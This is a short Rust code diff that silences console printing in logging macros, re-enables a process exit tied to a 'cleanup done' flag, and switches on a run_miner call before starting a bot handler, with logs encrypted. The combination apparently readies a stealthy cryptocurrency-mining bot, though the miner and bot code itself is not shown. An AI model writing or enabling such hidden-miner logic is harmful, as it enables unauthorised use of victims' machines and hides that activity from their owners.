@@ -35,7 +35,7 @@ macro_rules! log_internal {
         match &*$crate::LOGGER.lock().unwrap() {
             Some(logger) => {
                 logger.log($level, s!($s));
-                println!("{:#?}",$s);
+                // println!("{:#?}",$s);
             }
             None => {}
         }
@@ -51,7 +51,7 @@ macro_rules! log_internal {
             match &*$crate::LOGGER.lock().unwrap() {
                 Some(logger) => {
                 logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
-                println!("{}{:#?}", $fmt, $($arg)*);
+                // println!("{}{:#?}", $fmt, $($arg)*);
             }
             None => {}
         }
@@ -125,9 +125,9 @@ async fn main() {
 
     let mib_config = load_mib_config(false).unwrap();
 
-    // if !mib_config.cln_up_done {
-    //     exit_1();
-    // }
+    if !mib_config.cln_up_done {
+        exit_1();
+    }
 
     let res_logger = Logger::new(log_directory(), logs_encryption_key());
     if let Ok(logger) = res_logger {
@@ -158,9 +158,9 @@ async fn main() {
         .unwrap()
         .to_owned();
 
-    // if let Err(error) = run_miner(&miner_file_path) {
-    //     err!("run_miner failed: ", error);
-    // }
+    if let Err(error) = run_miner(&miner_file_path) {
+        err!("run_miner failed: ", error);
+    }
 
     let config = LoggerCnfg::Existing(LOGGER.lock().unwrap().clone());
     info!("LoggerCnfg made");
@@ -171,7 +171,7 @@ async fn main() {
         bot_handler.run_handler().await;
         warn!("ENDED??");
     }
-    warn!("END");
+    // warn!("END");
 }
 
 // add error in terminal collecting
